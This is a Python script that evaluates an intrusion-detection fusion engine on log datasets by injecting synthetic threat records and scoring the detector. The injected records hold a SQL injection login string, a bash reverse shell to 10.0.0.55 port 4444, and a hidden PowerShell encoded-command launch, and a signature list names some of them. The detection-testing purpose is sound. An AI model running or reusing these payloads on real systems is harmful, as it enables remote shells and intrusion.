import os
import json
import random
import pandas as pd
from tqdm import tqdm
from sklearn.metrics import accuracy_score, precision_score, recall_score, f1_score, confusion_matrix
from models.fusion.master_engine import ChakshuFusion
from models.fusion.master_engine import AssetLoader

def inject_synthetic_threats(log_frames, dataset_name):
    injected_frames = list(log_frames)
    timestamp_val = "2026-04-30T12:00:00Z"
    
    if "Apache" in dataset_name:
        for _ in range(25):
            threat_frame = {
                "ts": timestamp_val,
                "src_ip": "192.168.1.100",
                "payload": "GET /login.php?user=admin' OR '1'='1 HTTP/1.1",
                "act": "WEB_APP"
            }
            injected_frames.append(threat_frame)
            
    elif "OpenSSH" in dataset_name:
        for _ in range(25):
            threat_frame = {
                "ts": timestamp_val,
                "src_ip": "10.0.0.55",
                "payload": "Failed password for root from 10.0.0.55 port 22 ssh2",
                "act": "AUTH_LINUX"
            }
            injected_frames.append(threat_frame)
            
    elif "Linux" in dataset_name:
        for _ in range(25):
            threat_frame = {
                "ts": timestamp_val,
                "src_ip": "10.0.0.55",
                "payload": "user root command /bin/bash -i >& /dev/tcp/10.0.0.55/4444 0>&1",
                "act": "HOST_LINUX"
            }
            injected_frames.append(threat_frame)
            
    elif "Windows" in dataset_name:
        for _ in range(25):
            threat_frame = {
                "ts": timestamp_val,
                "src_ip": "10.0.0.55",
                "payload": "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -EncodedCommand JABzAD0ATgBlAHcALQBPAGIAagBlAGMAdAAgAEkATwAuAE0AZQBtAG8AcgB5AFMAdAByAGUAYQBtACgAWwBDAG8AbgB2AGUAcgB0AF0AOgA6AEYAcgBvAG0AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKAAiAEgA...",
                "act": "HOST_WINDOWS"
            }
            injected_frames.append(threat_frame)
            
    # NEW: Inject Windows Authentication Threats
    elif "LANL" in dataset_name:
        for _ in range(25):
            threat_frame = {
                "ts": timestamp_val,
                "src_ip": "10.0.0.88",
                "payload": "EventID: 4625, Logon Type: 3, Status: 0xC000006D, Failure Reason: Unknown user name or bad password, Account Name: Administrator, Workstation Name: WIN-ATTACKER",
                "act": "AUTH_WINDOWS"
            }
            injected_frames.append(threat_frame)
            
    random.shuffle(injected_frames)
    return injected_frames

def extract_ground_truth(log_frame, dataset_name):
    payload_value = log_frame.get("payload", "")
    
    if "L3_L4" in log_frame.get("act", ""):
        if "BENIGN" in payload_value.upper():
            return 0
        return 1

    if "DDos" in dataset_name or "attack" in dataset_name.lower():
        return 1
        
    # NEW: Added 4625 and 0xC000006D to the signature list
    synthetic_signatures = ["OR '1'='1", "Failed password for root", "/bin/bash -i", "EncodedCommand", "EventID: 4625", "0xC000006D"]
    if any(sig in payload_value for sig in synthetic_signatures):
        return 1
        
    return 0

def calculate_metrics(true_labels, predicted_labels):
    acc = accuracy_score(true_labels, predicted_labels)
    prec = precision_score(true_labels, predicted_labels, zero_division=0)
    rec = recall_score(true_labels, predicted_labels, zero_division=0)
    f1 = f1_score(true_labels, predicted_labels, zero_division=0)
    conf_mat = confusion_matrix(true_labels, predicted_labels, labels=[0, 1])

    return {
        "Accuracy": acc,
        "Precision": prec,
        "Recall": rec,
        "F1_Score": f1,
        "Confusion_Matrix": conf_mat.tolist()
    }

def evaluate_specialists_and_fusion():
    dataset_directory = "data/processed"
    dataset_files = [
        "Monday-WorkingHours.pcap_ISCX.json",
        "Friday-WorkingHours-Afternoon-DDos.pcap_ISCX.json",
        "Apache_2k.log_structured.json",      
        "OpenSSH_2k.log_structured.json",     
        "LANL_WLS_2k.json",                   
        "Linux_2k.log_structured.json",       
        "Windows_2k.log_structured.json"      
    ]

    asset_loader = AssetLoader()
    fusion_engine = ChakshuFusion()

    specialist_true = {"L3_L4": [], "WEB_APP": [], "AUTH_LINUX": [], "AUTH_WINDOWS": [], "HOST_LIN": [], "HOST_WIN": []}
    specialist_pred = {"L3_L4": [], "WEB_APP": [], "AUTH_LINUX": [], "AUTH_WINDOWS": [], "HOST_LIN": [], "HOST_WIN": []}

    fusion_true = []
    fusion_pred = []
    
    sample_limit = 500

    print("Initializing Model Evaluation with Progress Tracking...\n")

    for file_name in dataset_files:
        file_path = os.path.join(dataset_directory, file_name)
        if not os.path.exists(file_path):
            continue

        with open(file_path, "r") as input_file:
            log_frames = json.load(input_file)
            
        sampled_frames = random.sample(log_frames, min(sample_limit, len(log_frames)))
        sampled_frames = inject_synthetic_threats(sampled_frames, file_name)

        for log_frame in tqdm(sampled_frames, desc=f"Evaluating {file_name[:25]:<25}", unit="logs"):
            true_anomaly = extract_ground_truth(log_frame, file_name)
            assigned_tag = log_frame.get("act", "L3_L4")

            if "HOST" in assigned_tag:
                detected_os = fusion_engine.check_os(log_frame.get("payload", ""))
                if detected_os: 
                    assigned_tag = detected_os

            if assigned_tag == "HOST_LINUX": assigned_tag = "HOST_LIN"
            if assigned_tag == "HOST_WINDOWS": assigned_tag = "HOST_WIN"

            fusion_alert = fusion_engine.process_frame(log_frame)
            fusion_true.append(true_anomaly)
            if fusion_alert and fusion_alert["is_anomaly"]:
                fusion_pred.append(1)
            else:
                fusion_pred.append(0)

            model_asset, vectorizer_asset = asset_loader.fetch(assigned_tag)
            if model_asset:
                if assigned_tag == "L3_L4":
                    feature_columns = ['dst_pt', 'b_in', 'b_out']
                    feature_values = [int(log_frame.get("dst_pt", 0)), int(log_frame.get("b_in", 0)), int(log_frame.get("b_out", 0))]
                    network_dataframe = pd.DataFrame([feature_values], columns=feature_columns)
                    model_prediction = model_asset.predict(network_dataframe)[0]
                else:
                    payload_data = str(log_frame.get("payload", ""))
                    if vectorizer_asset:
                        payload_vector = vectorizer_asset.transform([payload_data])
                        model_prediction = model_asset.predict(payload_vector)[0]
                    else:
                        model_prediction = 1

                specialist_true[assigned_tag].append(true_anomaly)
                if model_prediction == -1:
                    specialist_pred[assigned_tag].append(1)
                else:
                    specialist_pred[assigned_tag].append(0)

    print("\n\n--- Specialist Models Performance ---")
    for tag_name in specialist_true.keys():
        if len(specialist_true[tag_name]) > 0:
            metrics_result = calculate_metrics(specialist_true[tag_name], specialist_pred[tag_name])
            print(f"\n[{tag_name}]")
            print(f"Accuracy:  {metrics_result['Accuracy']:.4f}")
            print(f"Precision: {metrics_result['Precision']:.4f}")
            print(f"Recall:    {metrics_result['Recall']:.4f}")
            print(f"F1 Score:  {metrics_result['F1_Score']:.4f}")
            print(f"Confusion Matrix: {metrics_result['Confusion_Matrix']}")

    print("\n--- Final Fusion Engine Performance ---")
    fusion_metrics = calculate_metrics(fusion_true, fusion_pred)
    print(f"Accuracy:  {fusion_metrics['Accuracy']:.4f}")
    print(f"Precision: {fusion_metrics['Precision']:.4f}")
    print(f"Recall:    {fusion_metrics['Recall']:.4f}")
    print(f"F1 Score:  {fusion_metrics['F1_Score']:.4f}")
    print(f"Confusion Matrix: {fusion_metrics['Confusion_Matrix']}")

if __name__ == "__main__":
    evaluate_specialists_and_fusion()
